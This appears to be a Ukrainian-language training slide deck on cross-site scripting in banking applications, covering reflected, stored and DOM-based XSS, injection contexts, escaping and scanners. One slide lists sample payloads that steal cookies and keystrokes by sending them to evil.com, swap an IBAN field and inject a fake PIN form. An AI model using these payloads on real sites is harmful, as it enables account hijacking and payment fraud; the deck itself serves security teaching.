Три типи XSS

↩️
Відображений (Reflected)
Payload у URL → відображається у відповіді. Потрібне посилання
💾
Збережений (Stored)
Зберігається в БД → вражає всіх відвідувачів. Найнебезпечніший
🌐
На основі DOM
Виконується в DOM без участі сервера. WAF не бачить

Stored XSS у полі «Призначення платежу» → скрипт виконується в браузері оператора банку з його привілеями.

Відображений XSS (Reflected)

Payload через URL-параметр

1
Підготовка
Зловмисник створює URL з payload
2
Доставка
Фішинг-лист з посиланням на домен банку
3
Відображення
Сервер вставляє payload без екранування
4
Виконання
JS виконується в контексті bank.com

Жертва бачить легітимний домен bank.com.ua в адресному рядку і довіряє сторінці.

Збережений XSS (Stored) — найнебезпечніший

Payload зберігається на сервері

📝 Вектори: коментарі, ім'я отримувача, призначення платежу, профіль
👥 Масштаб: вражає ВСІХ, хто переглядає сторінку — тисячі користувачів
🔓 Кейс 2019: XSS в імені рахунку → JS в панелі адміна банку
⚡ Не потрібна взаємодія — жертва просто відкриває сторінку

Одна Stored XSS = масова компрометація. Зловмисник створює рахунок із шкідливим ім'ям → всі оператори вражені.

XSS на основі DOM

Джерела → Приймачі (без участі сервера)

📥
Джерела (Sources)
location.hash
location.search
document.referrer
window.name
postMessage
📤
Приймачі (Sinks)
innerHTML
document.write()
eval()
setTimeout(string)
jQuery.html()

Payload через fragment (#) не передається на сервер → серверні WAF безсилі. Тільки клієнтський захист.

Контексти ін'єкції

Різний контекст = різне екранування

📄
HTML body
< → &lt; > → &gt;
🏷️
HTML attribute
+ екранування лапок " '
⚙️
JavaScript
Unicode-escape \uXXXX
🔗
URL-параметр
Percent-encoding %XX

Універсального захисту не існує! Екранування для HTML не працює в JavaScript-контексті і навпаки.

Контексти XSS-ін'єкцій

HTML / JavaScript / URL / CSS

📄
HTML-контекст
Ін'єкція між тегами: <div>USER_INPUT</div>. Потрібно екранувати < > & " '
⚙️
JS-контекст
Ін'єкція в рядок JS: var x = 'USER_INPUT'. Закриття рядка + довільний код
🔗
URL-контекст
Ін'єкція в href: javascript:alert(1). Перевірка протоколу обов'язкова
🎨
CSS-контекст
Ін'єкція в style: expression(), url(). CSS-exfiltration через селектори

Кожен контекст вимагає свого encoding. HTML-encoding у JS-контексті НЕ захищає!

Приклади XSS-payload

Типові вектори атак у фінансових додатках

🍪
Крадіжка Cookie
new Image().src="https://evil.com/?c="+document.cookie
🔑
Кейлогер (Keylogger)
document.onkeypress=e=>fetch('//evil.com/k?'+e.key)
💸
Підміна IBAN
document.querySelector('#iban').value='UA21..EVIL'
📋
Фішинг-форма
document.body.innerHTML='<form action=evil.com>Введіть PIN:...'

Усі payload виконуються в контексті домену банку — жертва бачить легітимний URL і довіряє сторінці.

Інструменти виявлення XSS

Автоматизація пошуку вразливостей

🔍
Burp Suite Scanner
Автоматичне сканування всіх параметрів. Комерційний стандарт для пентесту
🛠️
OWASP ZAP
Безкоштовний сканер. Active/Passive scan. Ajax Spider для SPA
🤖
Nuclei + XSS шаблони
Швидке сканування за відомими CVE та патернами XSS у фреймворках
📊
DOM Invader (Burp)
Спеціалізований інструмент для DOM XSS: відстеження sources → sinks

Комбінуйте автоматичне сканування з ручним тестуванням. Сканери знаходять ~70% XSS, решту — лише людина.

🛡️

Ключові висновки

1️⃣ Відображений (Reflected) — через URL, потрібне посилання, email-фішинг
2️⃣ Збережений (Stored) — у БД, вражає всіх, найнебезпечніший для FinTech
3️⃣ На основі DOM — без серверу, невидимий для WAF
4️⃣ Контекст важливий — кожне місце вимагає свого encoding
